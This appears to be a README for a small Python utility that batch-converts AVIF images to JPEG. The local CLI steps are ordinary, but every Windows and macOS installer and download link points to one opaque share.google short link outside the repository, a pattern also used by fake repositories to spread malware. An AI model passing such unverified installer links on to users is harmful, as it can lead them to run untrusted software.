![AVIF to JPG](assets/hero.png)

# AVIF to JPG

*Phone AVIF into a JPEG folder.*

## What AVIF to JPG is

**AVIF to JPG** is an image utility. Convert AVIF stills to JPEG so older Windows apps can open them.

Some mail clients and older viewers still choke on AVIF.

No browser upload step: the work happens on disk, then you keep the output folder.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Quality setting
- Folder batch
- Keeps AVIF sources
- Reports skipped files

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/victorsimmons831/avif-to-jpg

MIT license. See `LICENSE`.
